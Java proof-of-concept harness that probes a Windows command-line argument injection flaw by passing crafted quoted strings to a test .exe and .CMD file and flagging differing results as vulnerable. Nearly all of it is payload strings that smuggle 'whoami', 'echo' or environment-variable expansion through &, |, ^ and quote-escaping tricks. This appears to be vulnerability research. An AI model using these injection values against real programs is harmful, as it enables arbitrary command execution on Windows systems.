package sebres.PoC_0day_WinExec;
import java.io.*;

public class test_dump_inv {

  static void _out(String msg) {
    System.out.print(msg);
  }

  public static void main(String[] args) {
    String exeFiles[] = {
      "test-dump.exe", "test-dump.CMD"
    };
    String Args[] = {
      // "test whoami",

      "test\"whoami",       "test\"\"whoami",
      "test\"\"\"whoami",   "test\"\"\"\"whoami",
      
      "test\"whoami\\",       "test\"\"whoami\\",
      "test\"\"\"whoami\\",   "test\"\"\"\"whoami\\",
      "test\"whoami\\\\",     "test\"\"whoami\\\\",
      "test\"\"\"whoami\\\\", "test\"\"\"\"whoami\\\\",

      "test\\\\&\\\\test",       "test\"\\\\&\\\\test",
      "\"test\\\\&\\\\test",     "\"test\"\\\\&\\\\\"test\"",
      "test\\\\\"&\"\\\\test",   "test\"\\\\\"&\"\\\\test",
      "\"test\\\\\"&\"\\\\test", "\"test\"\\\\\"&\"\\\\\"test\"",

      "test\\\"&whoami",       "test\"\\\"&whoami",
      "test\"\"\\\"&whoami",   "test\"\"\"\\\"&whoami",
      "test\\\"\\&whoami",     "test\"\\\"\\&whoami",
      "test\"\"\\\"\\&whoami", "test\"\"\"\\\"\\&whoami",
      
      "test&whoami",       "test|whoami",
      "\"test&whoami",     "\"test|whoami",
      "test\"&whoami",     "test\"|whoami",
      "\"test\"&whoami",   "\"test\"|whoami",
      "\"\"test\"&whoami", "\"\"test\"|whoami",

      "test&echo \"",         "test|echo \"",
      "\"test&echo \"",       "\"test|echo \"",
      "test\"&echo \"",       "test\"|echo \"",
      "\"test\"&echo \"",     "\"test\"|echo \"",
      "\"\"test\"&echo \"",   "\"\"test\"|echo \"",

      "test&echo \"\"",       "test|echo \"\"",
      "\"test&echo \"\"",     "\"test|echo \"\"",
      "test\"&echo \"\"",     "test\"|echo \"\"",
      "\"test\"&echo \"\"",   "\"test\"|echo \"\"",
      "\"\"test\"&echo \"\"", "\"\"test\"|echo \"\"",

      "test>whoami",       "test<whoami",
      "\"test>whoami",     "\"test<whoami",
      "test\">whoami",     "test\"<whoami",
      "\"test\">whoami",   "\"test\"<whoami",
      "\"\"test\">whoami", "\"\"test\"<whoami",
      "test(whoami)",      "test(whoami)",
      "test\"(whoami)",    "test\"(whoami)",
      "test^whoami",       "test^^echo ^^^",
      "test\"^whoami",     "test\"^^echo ^^^",
      "test\"^echo ^^^\"", "test\"\"^echo\" ^^^\"",

      "test%USERDOMAIN%\\%USERNAME%",
      "test\" %USERDOMAIN%\\%USERNAME%",
      "test%USERDOMAIN%\\\\%USERNAME%",
      "test\" %USERDOMAIN%\\\\%USERNAME%",
      "test%USERDOMAIN%&%USERNAME%",
      "test\" %USERDOMAIN%&%USERNAME%",
      "test%USERDOMAIN%\\&\\%USERNAME%",
      "test\" %USERDOMAIN%\\&\\%USERNAME%",

      "test%USERDOMAIN%\\&\\test",
      "test\" %USERDOMAIN%\\&\\test",
      "test%USERDOMAIN%\\\\&\\\\test",
      "test\" %USERDOMAIN%\\\\&\\\\test",

      "test%USERDOMAIN%\\&\\\"test",
      "test\" %USERDOMAIN%\\&\\\"test",
      "test%USERDOMAIN%\\\\&\\\\\"test",
      "test\" %USERDOMAIN%\\\\&\\\\\"test"
    };

    String[] cmdArray = new String[2];

    int c = 0;    
    for (String arg : Args) {

      _out(new String(new char[20]).replace("\0", "-") + "\n");

      String prev = null;
      for (String exe : exeFiles) {
        try {
          cmdArray[0] = exe;
          cmdArray[1] = arg;

          _out(String.format("*%3d) `%s\u00b4 `%s\u00b4", 
            c, cmdArray[0], cmdArray[1]));

          // Process process = Runtime.getRuntime().exec(cmdArray,null);
          // ProcessBuilder pb = new ProcessBuilder(cmdArray);
          ProcessBuilder pb = new ProcessBuilder(cmdArray[0], cmdArray[1]);
          pb.redirectErrorStream(true);
          Process process = pb.start();

          BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
          process.waitFor();

          String line, res = "";
          while ((line = reader.readLine ()) != null) {
            if (res != "") {res += "\n";}
            res += line;
          }

          if (res.equals(String.format("    `%s\u00b4 `%s\u00b4", 
            exeFiles[0], cmdArray[1]))) {
            _out("\n");
          } else {
            if (prev == null || res.equals(prev)) {
              _out(" -- *DIFFERENT*\n");
              //System.exit(-1);
            } else {
              _out(" -- *VULNERABLE*\n");
            }
          }
          prev = res;

          _out("  " + res + "\n");
        } catch (Exception ex) {
          ex.printStackTrace();
        }
      }

      c++;
    }

    _out("done.");
  }

}
